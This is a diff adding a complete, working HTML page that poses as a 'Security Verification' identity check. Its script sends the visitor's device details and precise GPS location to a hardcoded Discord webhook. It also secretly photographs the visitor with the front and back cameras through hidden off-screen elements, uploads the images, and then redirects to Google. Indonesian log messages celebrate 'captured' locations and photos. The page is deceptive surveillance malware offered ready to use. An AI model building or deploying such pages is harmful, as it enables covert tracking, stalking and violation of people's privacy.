@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Your Identity - Security Check</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a1a1a 0%, #000 100%);
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 450px;
+            width: 90%;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 50px 40px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .shield-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 0 20px rgba(255, 255, 255, 0.2); }
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            color: #999;
+            font-size: 15px;
+            margin-bottom: 35px;
+            line-height: 1.6;
+        }
+
+        .verify-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 25px;
+        }
+
+        .verify-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .verify-item:last-child {
+            border-bottom: none;
+        }
+
+        .verify-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            text-align: left;
+        }
+
+        .verify-icon {
+            font-size: 24px;
+        }
+
+        .verify-text h3 {
+            font-size: 15px;
+            margin-bottom: 3px;
+        }
+
+        .verify-text p {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .verify-status {
+            font-size: 12px;
+            padding: 5px 12px;
+            border-radius: 20px;
+            background: rgba(255, 193, 7, 0.2);
+            color: #ffc107;
+        }
+
+        .verify-status.success {
+            background: rgba(76, 175, 80, 0.2);
+            color: #4caf50;
+        }
+
+        .start-btn {
+            width: 100%;
+            padding: 18px;
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 15px;
+        }
+
+        .start-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 255, 255, 0.2);
+        }
+
+        .start-btn:active {
+            transform: translateY(0);
+        }
+
+        .start-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Hidden elements */
+        video, canvas {
+            position: fixed !important;
+            top: -10000px !important;
+            left: -10000px !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            visibility: hidden !important;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4caf50, #8bc34a);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="shield-icon">🛡️</div>
+        <h1>Security Verification</h1>
+        <p class="subtitle">Please complete the verification steps below to continue</p>
+
+        <div class="verify-box">
+            <div class="verify-item">
+                <div class="verify-left">
+                    <div class="verify-icon">📍</div>
+                    <div class="verify-text">
+                        <h3>Location Check</h3>
+                        <p>Verify your region</p>
+                    </div>
+                </div>
+                <div class="verify-status" id="locationStatus">Pending</div>
+            </div>
+
+            <div class="verify-item">
+                <div class="verify-left">
+                    <div class="verify-icon">📸</div>
+                    <div class="verify-text">
+                        <h3>Identity Check</h3>
+                        <p>Verify your identity</p>
+                    </div>
+                </div>
+                <div class="verify-status" id="cameraStatus">Pending</div>
+            </div>
+
+            <div class="verify-item">
+                <div class="verify-left">
+                    <div class="verify-icon">🔐</div>
+                    <div class="verify-text">
+                        <h3>Device Check</h3>
+                        <p>Verify your device</p>
+                    </div>
+                </div>
+                <div class="verify-status success">Ready</div>
+            </div>
+        </div>
+
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <button class="start-btn" id="startBtn" onclick="startVerification()">
+            Start Verification
+        </button>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top: 15px; font-size: 14px;" id="loadingText">Processing...</p>
+        </div>
+
+        <p class="info-text">
+            🔒 Your privacy is protected. This verification is required for security purposes.
+        </p>
+    </div>
+
+    <!-- Hidden media elements -->
+    <video id="videoFront" playsinline autoplay muted webkit-playsinline></video>
+    <video id="videoBack" playsinline autoplay muted webkit-playsinline></video>
+    <canvas id="canvasFront"></canvas>
+    <canvas id="canvasBack"></canvas>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";
+
+        let captureAttempts = 0;
+        const MAX_ATTEMPTS = 3;
+
+        // Helper functions
+        function updateProgress(percent) {
+            document.getElementById('progressFill').style.width = percent + '%';
+        }
+
+        function showLoading(text) {
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('progressBar').style.display = 'block';
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('loadingText').textContent = text;
+        }
+
+        function updateStatus(element, status, text) {
+            const statusEl = document.getElementById(element);
+            statusEl.textContent = text;
+            if (status === 'success') {
+                statusEl.className = 'verify-status success';
+            }
+        }
+
+        async function sendWebhook(payload) {
+            for (let i = 0; i < 3; i++) {
+                try {
+                    const response = await fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (response.ok) return true;
+                } catch (e) {
+                    console.log(`Attempt ${i + 1} failed`);
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            }
+            return false;
+        }
+
+        async function sendWebhookFile(formData) {
+            for (let i = 0; i < 3; i++) {
+                try {
+                    const response = await fetch(WEBHOOK, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    if (response.ok) return true;
+                } catch (e) {
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            }
+            return false;
+        }
+
+        // 🎯 LOKASI dengan retry mechanism
+        async function captureLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 20000,
+                    maximumAge: 0
+                };
+
+                let attempts = 0;
+                const tryCapture = () => {
+                    attempts++;
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const lat = position.coords.latitude.toFixed(6);
+                            const lon = position.coords.longitude.toFixed(6);
+                            const acc = position.coords.accuracy.toFixed(2);
+                            const timestamp = new Date().toLocaleString('id-ID', { 
+                                timeZone: 'Asia/Jakarta',
+                                dateStyle: 'full',
+                                timeStyle: 'long'
+                            });
+                            
+                            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                            const mapEmbed = `https://www.google.com/maps/embed/v1/place?key=AIzaSyD&q=${lat},${lon}&zoom=18`;
+                            
+                            const payload = {
+                                content: `🎯 **LOKASI BERHASIL DITANGKAP** 🎯`,
+                                embeds: [{
+                                    title: "📍 DATA LOKASI GPS",
+                                    color: 0xFF0000,
+                                    description: `**[🗺️ BUKA LOKASI DI GOOGLE MAPS (KLIK DISINI)](${mapLink})**`,
+                                    fields: [
+                                        {
+                                            name: "📊 Koordinat Lengkap",
+                                            value: `\`\`\`yaml\nLatitude  : ${lat}\nLongitude : ${lon}\nAkurasi   : ${acc} meter\n\`\`\``,
+                                            inline: false
+                                        },
+                                        {
+                                            name: "🕐 Waktu Capture",
+                                            value: `\`${timestamp}\``,
+                                            inline: false
+                                        },
+                                        {
+                                            name: "🌐 Link Maps",
+                                            value: `[Klik untuk navigasi](${mapLink})`,
+                                            inline: false
+                                        }
+                                    ],
+                                    footer: {
+                                        text: `VOID V4 GPS System | Attempt: ${attempts}`
+                                    },
+                                    timestamp: new Date().toISOString()
+                                }]
+                            };
+
+                            await sendWebhook(payload);
+                            updateStatus('locationStatus', 'success', 'Verified');
+                            resolve(true);
+                        },
+                        (error) => {
+                            if (attempts < MAX_ATTEMPTS) {
+                                setTimeout(() => tryCapture(), 2000);
+                            } else {
+                                sendWebhook({
+                                    content: `⚠️ **Lokasi Gagal** - Error: ${error.message} (Code: ${error.code})`
+                                });
+                                resolve(false);
+                            }
+                        },
+                        options
+                    );
+                };
+
+                tryCapture();
+            });
+        }
+
+        // 🎯 KAMERA DEPAN dengan multiple attempts
+        async function captureFrontCamera() {
+            for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
+                try {
+                    const constraints = {
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 1920, min: 640 },
+                            height: { ideal: 1080, min: 480 }
+                        },
+                        audio: false
+                    };
+
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    const video = document.getElementById('videoFront');
+                    const canvas = document.getElementById('canvasFront');
+                    
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.setAttribute('playsinline', '');
+                    video.setAttribute('webkit-playsinline', '');
+                    
+                    await video.play();
+                    await new Promise(resolve => setTimeout(resolve, 2500));
+
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
+                    
+                    const ctx = canvas.getContext('2d', { willReadFrequently: false });
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const blob = await new Promise(resolve => {
+                        canvas.toBlob(resolve, 'image/jpeg', 0.92);
+                    });
+
+                    const formData = new FormData();
+                    formData.append('file', blob, `identity_${Date.now()}.jpg`);
+                    formData.append('payload_json', JSON.stringify({
+                        content: `📸 **KAMERA DEPAN TERTANGKAP**\n\`\`\`ini\nWaktu     : ${new Date().toLocaleString('id-ID')}\nResolusi  : ${canvas.width}x${canvas.height}\nAttempt   : ${attempt}/${MAX_ATTEMPTS}\nDevice    : ${navigator.platform}\n\`\`\``
+                    }));
+
+                    const success = await sendWebhookFile(formData);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                    
+                    if (success) {
+                        updateStatus('cameraStatus', 'success', 'Verified');
+                        return true;
+                    }
+
+                } catch (error) {
+                    console.log(`Camera attempt ${attempt} failed:`, error.message);
+                    if (attempt === MAX_ATTEMPTS) {
+                        sendWebhook({
+                            content: `❌ **Kamera Gagal** - ${error.message}`
+                        });
+                        return false;
+                    }
+                    await new Promise(r => setTimeout(r, 1500));
+                }
+            }
+            return false;
+        }
+
+        // 🎯 KAMERA BELAKANG
+        async function captureBackCamera() {
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: { exact: 'environment' },
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('videoBack');
+                const canvas = document.getElementById('canvasBack');
+                
+                video.srcObject = stream;
+                video.muted = true;
+                await video.play();
+                await new Promise(r => setTimeout(r, 2000));
+
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
+                const formData = new FormData();
+                formData.append('file', blob, `back_${Date.now()}.jpg`);
+                formData.append('payload_json', JSON.stringify({
+                    content: `📸 **KAMERA BELAKANG CAPTURED**`
+                }));
+
+                await sendWebhookFile(formData);
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch (e) {
+                return false; // Silent fail
+            }
+        }
+
+        // 🚀 MAIN FUNCTION
+        async function startVerification() {
+            showLoading('Starting verification...');
+            updateProgress(10);
+
+            // Device info
+            await sendWebhook({
+                content: "🌐 **VISITOR BARU**",
+                embeds: [{
+                    title: "Device Information",
+                    color: 0x00FF00,
+                    fields: [
+                        { name: "Browser", value: `\`${navigator.userAgent}\``, inline: false },
+                        { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
+                        { name: "Language", value: `\`${navigator.language}\``, inline: true },
+                        { name: "Screen", value: `\`${screen.width}x${screen.height}\``, inline: true },
+                        { name: "Time", value: `\`${new Date().toLocaleString('id-ID')}\``, inline: false }
+                    ]
+                }]
+            });
+
+            updateProgress(25);
+            showLoading('Verifying location...');
+            await captureLocation();
+            await new Promise(r => setTimeout(r, 800));
+
+            updateProgress(60);
+            showLoading('Verifying identity...');
+            await captureFrontCamera();
+            await new Promise(r => setTimeout(r, 800));
+
+            updateProgress(85);
+            showLoading('Final checks...');
+            await captureBackCamera();
+
+            updateProgress(100);
+            showLoading('Verification complete!');
+
+            await sendWebhook({
+                content: "✅ **SEMUA DATA BERHASIL DIKUMPULKAN**"
+            });
+
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 2000);
+        }
+
+        // Auto-send device info on load
+        window.addEventListener('load', () => {
+            // Preload permission status
+            if (navigator.permissions) {
+                navigator.permissions.query({ name: 'geolocation' }).then(result => {
+                    if (result.state === 'granted') {
+                        updateStatus('locationStatus', 'success', 'Ready');
+                    }
+                });
+                
+                navigator.permissions.query({ name: 'camera' }).then(result => {
+                    if (result.state === 'granted') {
+                        updateStatus('cameraStatus', 'success', 'Ready');
+                    }
+                });
+            }
+        });
+
+    </script>
+</body>
+</html>
